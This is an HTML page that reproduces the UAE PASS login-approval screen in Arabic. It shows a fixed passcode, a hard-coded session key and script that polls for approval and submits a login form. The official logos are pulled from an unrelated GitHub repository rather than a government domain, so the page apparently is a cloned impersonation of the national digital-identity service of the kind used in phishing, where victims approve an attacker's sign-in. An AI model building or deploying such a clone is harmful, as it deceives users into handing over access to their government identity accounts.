<!doctype html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" type="image/x-icon" href="https://raw.githubusercontent.com/invamsa-ai/saudi/main/favicon.ico">
    
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    
    <!-- jQuery -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    
    <title>UAE PASS - الموافقة على طلب تسجيل الدخول</title>
    
    <style>
        /* CSS الأساسي */
        body, html {
            font-family: 'Dubai', 'Roboto', sans-serif !important;
            background: #F9F9FB;
            margin: 0;
            padding: 0;
        }

        .flex {
            display: flex;
        }

        .login-container {
            max-width: 1280px;
            margin: auto;
            flex: 0 0 100%;
        }

        .login-container-fluid {
            max-width: 100%;
        }

        .header {
            background: #fff;
            height: 64px;
            padding: 16px 0px;
        }

        .header-title {
            color: #1B1B1F;
            font-style: normal;
            font-weight: 300;
            line-height: 32px;
            font-size: 22px;
            padding: 0px 16px;
        }

        .card {
            margin: 48px 0px 10px 0px;
        }

        .card-info {
            position: relative;
            display: flex;
            flex-direction: column;
            min-width: 0;
            word-wrap: break-word;
            background-clip: border-box;
            border-radius: 0.25rem;
            margin: 48px 0px 10px 0px;
            border: 0px !important;
        }

        .card.login {
            padding: 48px;
            margin: 48px 0px 10px 0px;
            border: 1.6px solid transparent;
            border-radius: 19px;
            background-image: linear-gradient(to right bottom, white, white), 
                              radial-gradient(circle at top left, #ACE4AC, #fff, #fff 100%);
            background-origin: border-box;
            background-clip: padding-box, border-box;
        }

        .card.login .card-header {
            display: flex;
            justify-content: space-between;
            background: white;
            border: 0;
            padding: 0px;
        }

        .card.login .card-content {
            display: flex;
            flex-direction: row;
            flex-grow: 1;
            justify-content: space-between;
        }

        .card.login .card-content .card-content-left {
            max-width: 70%;
            padding-right: 40px;
        }

        .login-pin-image {
            max-width: 400px;
            width: 100%;
        }

        .info-title {
            font-size: 18px;
            font-style: normal;
            font-weight: 500;
        }

        .info-app-name {
            font-size: 16px;
            font-style: normal;
            font-weight: 400;
            padding: 32px 0px;
        }

        .info-description {
            font-size: 28px;
            font-style: normal;
            font-weight: 400;
            line-height: 36px;
            max-width: 500px;
        }

        @keyframes spin {
            from {transform: translate(-50%, -50%) rotate(0);}
            to   {transform: translate(-50%, -50%) rotate(360deg);}
        }

        .passcode-card {
            color: #454F63;
            width: 90px;
            height: 90px;
            margin: auto;
            position: relative;
            overflow: hidden;
            border-radius: 16px;
            display: inline-block;
        }

        .passcode-card::before {
            content: '';
            display: block;
            background: conic-gradient(
                #fff 0.0turn 0.125turn,
                #fff 0.125turn 0.25turn,
                #fff 0.25turn 0.375turn,
                #fff 0.375turn 0.5turn,
                #fff 0.5turn 0.625turn,
                #fff 0.625turn 0.75turn,
                #20644B 0.75turn 0.875turn,
                #20644B 0.875turn 1.0turn
            );
            width: calc(100% * 1.41421356237);
            padding-bottom: calc(100% * 1.41421356237);
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
            border-radius: 100%;
            animation: spin 5s linear infinite;
        }

        .passcode-card::after {
            content: attr(data-after-content);
            position: absolute;
            inset: 0.15rem;
            background: #ECF3EC;
            border-radius: 0.85rem;
            font-size: 52px;
            font-style: normal;
            font-weight: 400;
            text-align: center;
            line-height: 100px;
        }

        .uaepass-logo {
            width: 32px;
            object-fit: contain;
            height: 32px;
            padding: 6px
        }

        .uaepass-text-logo {
            display: flex;
            height: 41px;
            justify-content: center;
            align-items: center;
        }

        .timer-img {
            width: 25px;
            height: 20px;
            padding: 1.667px 5.149px 2.415px 4.706px;
            justify-content: center;
            align-items: center;
        }

        .waiting-confirmation {
            color: #C78200;
            font-family: Roboto;
            font-size: 18px;
            font-style: normal;
            font-weight: 400;
            line-height: normal;
            padding-top: 52px;
        }

        .cancel-request {
            color: #FF5545;
            border: 0;
            background: transparent;
            font-size: 18px;
            font-style: normal;
            font-weight: 500;
            line-height: 24px;
            cursor: pointer;
        }

        .cancel-request:after {
            display: inline-block;
            content: "\00d7";
            font-size: 28px;
            padding: 10px 0px;
            font-weight: 400;
        }

        .polling-footer {
            position: relative;
            width: 100%;
            text-align: center;
            margin-top: 20px;
        }

        .poweredby {
            font-size: 1rem;
            font-weight: 500;
            line-height: 1.5;
            text-align: center;
            color: #454f63;
        }

        .ids-logo {
            width: 13px;
            height: 13px;
            object-fit: contain;
            margin-right: 5px;
        }

        /* الصورة على الجانب للكمبيوتر */
        .card-content-right {
            display: flex;
            align-items: center;
            justify-content: center;
        }

        /* Responsive */
        @media only screen and (max-width: 600px) {
            /* على الموبايل: اخفاء الصورة على الجانب وإظهار الصورة في الأعلى */
            .card-content-right {
                display: none;
            }
            
            .card-content-right-mobile {
                display: block;
                text-align: center;
                margin-bottom: 20px;
            }
            
            .cancel-request-div {
                display: none;
            }
            
            .cancel-request-mobile {
                display: block;
                margin-top: 20px;
                text-align: center;
            }
            
            .card.login {
                padding: 20px;
                margin: 20px 0;
            }
            
            .login-pin-image {
                max-width: 200px;
            }
            
            .info-description {
                font-size: 18px;
                line-height: 1.5;
            }
            
            .card.login .card-content .card-content-left {
                max-width: 100%;
                padding-right: 0;
                text-align: center;
            }
            
            .header-section {
                display: none;
            }
            
            .card.login {
                height: 100vh;
                margin: 0;
            }
            
            .waiting-confirmation {
                padding-top: 25px;
            }
        }

        @media only screen and (min-width: 601px) {
            /* على الكمبيوتر: اخفاء الصورة في الأعلى */
            .card-content-right-mobile {
                display: none;
            }
            
            .cancel-request-mobile {
                display: none;
            }
        }
        
        .row:before, .row:after {
            width: 0 !important; 
            height: 0 !important;
        }
        
        .js-hidden {
            opacity: 0;
            transition: opacity 0.3s ease;
        }
        
        .js-visible {
            opacity: 1;
        }
    </style>
</head>
<body>
    <div class="main-container">
        <!-- Header Section -->
        <div class="header-section">
            <div class="login-container-fluid header">
                <div class="login-container flex">
                    <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/uae-pass-logo.png" 
                         alt="UAE PASS Logo" 
                         class="uaepass-logo">
                    <div class="header-title">الموافقة على طلب تسجيل الدخول</div>
                </div>
            </div>
        </div>

        <!-- Main Content -->
        <div class="login-container-fluid">
            <div class="login-container">
                <form id="loginForm" action="../../commonauth" method="post"
                      enctype="application/x-www-form-urlencoded" autocomplete="off" novalidate>
                    
                    <!-- Hidden Inputs -->
                    <input id="username" name="username" type="hidden" value="">
                    <input id="cancelOnWeb" type="hidden" name="cancelOnWeb" value="">
                    <input id="tocommonauth" name="tocommonauth" type="hidden" value="true">
                    <input id="password" name="password" type="hidden" value="">
                    <input type="hidden" id="sessionDataKey" name="sessionDataKey" value='f9b79f82-8317-4f54-aa60-0cd566553e95' />
                    
                    <!-- New input for username from user -->
                    <input type="hidden" id="usernameUserInput" name="usernameUserInput" value="">

                    <!-- Login Card -->
                    <div class="card login js-hidden">
                        <div class="card-header">
                            <div>
                                <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/digital_id_H.svg" 
                                     alt="Digital ID" 
                                     class="uaepass-text-logo">
                            </div>
                            <div class="cancel-request-div">
                                <button type="button" class="cancel-request" onclick="cancel()" aria-label="إلغاء الطلب">
                                    إلغاء الطلب
                                </button>
                            </div>
                        </div>
                        
                        <div class="card-content">
                            <!-- Left Content -->
                            <div class="card-content-left">
                                <div class="card-info">
                                    <div class="info-title">
                                        طلب تسجيل الدخول من
                                    </div>
                                    <div class="info-app-name">Self Service Portal</div>

                                    <!-- Mobile Image - تظهر فقط على الموبايل -->
                                    <div class="card-content-right-mobile">
                                        <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/login-pin.svg" 
                                             alt="Login PIN" 
                                             class="login-pin-image">
                                    </div>

                                    <div class="info-description">
                                        <span>افتح تطبيق الهوية الرقمية الخاص بك، وأدخل الرقم الموضح لتسجيل الدخول</span>
                                    </div>
                                    
                                    <!-- Passcode Display -->
                                    <div class="card-info">
                                        <div class="passcode-card" data-after-content="97" aria-label="الرمز 97"></div>
                                    </div>
                                    
                                    <!-- Waiting Status -->
                                    <div class="waiting-confirmation">
                                        <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/Timer.gif" 
                                             alt="Timer" 
                                             class="timer-img">
                                        في انتظار تأكيدك
                                    </div>

                                    <!-- Mobile Cancel Button -->
                                    <div class="cancel-request-mobile">
                                        <button type="button" class="cancel-request" onclick="cancel()" aria-label="إلغاء الطلب">
                                            إلغاء الطلب
                                        </button>
                                    </div>
                                </div>
                            </div>
                            
                            <!-- Desktop Image - تظهر فقط على الكمبيوتر -->
                            <div class="card-content-right">
                                <img src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/login-pin.svg" 
                                     alt="Login PIN" 
                                     class="login-pin-image">
                            </div>
                        </div>
                    </div>
                    
                    <!-- Footer -->
                    <div class="polling-footer">
                        <img class="ids-logo" 
                             src="https://raw.githubusercontent.com/invamsa-ai/saudi/main/n6.png" 
                             alt="IDS Logo" />
                        <p class="poweredby"> Powered by UAE PASS </p>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <!-- JavaScript -->
    <script type="text/javascript">
        // Immediately show content when JS loads
        document.addEventListener('DOMContentLoaded', function() {
            var loginCard = document.querySelector('.card.login');
            if (loginCard) {
                loginCard.classList.remove('js-hidden');
                loginCard.classList.add('js-visible');
            }
        });

        // URL parameter utility
        function getParameterByName(name, url) {
            if (!url) url = window.location.href;
            name = name.replace(/[\[\]]/g, '\\$&');
            var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
                results = regex.exec(url);
            if (!results) return null;
            if (!results[2]) return "";
            return decodeURIComponent(results[2].replace(/\+/g, ' '));
        }

        // Form submission prevention
        function preventDoubleSubmission(form) {
            if (form.dataset.submitted === 'true') {
                console.warn("Prevented double submission");
                return false;
            }
            form.dataset.submitted = 'true';
            return true;
        }

        // Cancel request handler
        function cancel() {
            var cancelInput = document.getElementById('cancelOnWeb');
            if (cancelInput) {
                cancelInput.value = "cancelledOnWebWaiting";
                var form = document.getElementById('loginForm');
                if (form && preventDoubleSubmission(form)) {
                    form.submit();
                }
            }
        }

        // Timeout handler
        function timeout() {
            var cancelInput = document.getElementById('cancelOnWeb');
            if (cancelInput) {
                cancelInput.value = "webWaitingTimeout";
                var form = document.getElementById('loginForm');
                if (form && preventDoubleSubmission(form)) {
                    form.submit();
                }
            }
        }

        // Polling function
        function startPolling() {
            var trx = getParameterByName("trx");
            if (!trx) return;

            var cancelInput = document.getElementById('cancelOnWeb');
            
            function poll() {
                if (cancelInput.value === "cancelledOnWebWaiting" || 
                    cancelInput.value === "webWaitingTimeout") {
                    return;
                }

                var pollingUrl = "/auth/trx/status?trx=" + encodeURIComponent(trx);
                
                fetch(pollingUrl, {
                    method: 'GET',
                    cache: 'no-cache',
                    headers: {
                        'Accept': 'application/json'
                    }
                })
                .then(response => {
                    if (!response.ok) throw new Error('Network response was not ok');
                    return response.json();
                })
                .then(data => {
                    if (data.code == '0') {
                        if (data.isConfirmed == '0') {
                            setTimeout(poll, 2000);
                        } else {
                            var form = document.getElementById('loginForm');
                            if (form && preventDoubleSubmission(form)) {
                                form.submit();
                            }
                        }
                    }
                })
                .catch(error => {
                    console.error('Polling error:', error);
                    setTimeout(poll, 2000);
                });
            }

            setTimeout(poll, 3000);
            setTimeout(timeout, 180000);
        }

        // Session validation
        function checkSessionKey() {
            var sessionDataKey = getParameterByName("sessionDataKey");
            var relyingParty = getParameterByName("relyingParty");
            var tenantDomain = getParameterByName("tenantDomain");
            
            if (!sessionDataKey) return;

            var url = "/logincontext?sessionDataKey=" + encodeURIComponent(sessionDataKey) + 
                      "&relyingParty=" + encodeURIComponent(relyingParty) + 
                      "&tenantDomain=" + encodeURIComponent(tenantDomain);

            fetch(url, {
                method: 'GET',
                cache: 'no-cache'
            })
            .then(response => response.json())
            .then(data => {
                if (data && data.status == 'redirect' && data.redirectUrl) {
                    window.location.href = data.redirectUrl;
                }
            })
            .catch(error => console.error('Session check error:', error));
        }

        // Initialize everything
        function initialize() {
            checkSessionKey();
            startPolling();
            
            var form = document.getElementById('loginForm');
            if (form) {
                form.addEventListener('submit', function(e) {
                    var usernameInput = document.getElementById('username');
                    var usernameUserInput = document.getElementById('usernameUserInput');
                    var tenantName = getParameterByName("tenantDomain");
                    
                    if (usernameUserInput && usernameInput) {
                        var usernameUserInputValue = usernameUserInput.value.trim();
                        
                        if (getParameterByName("isSaaSApp") === "false") {
                            var isEmailUsernameEnabled = false;
                            
                            if (!isEmailUsernameEnabled && usernameUserInputValue.includes('@')) {
                                usernameInput.value = usernameUserInputValue;
                            } else {
                                usernameInput.value = usernameUserInputValue + "@" + tenantName;
                            }
                        } else {
                            usernameInput.value = usernameUserInputValue;
                        }
                    }
                    
                    if (!preventDoubleSubmission(this)) {
                        e.preventDefault();
                    }
                });
            }
        }

        window.addEventListener('load', initialize);
    </script>
</body>
</html>
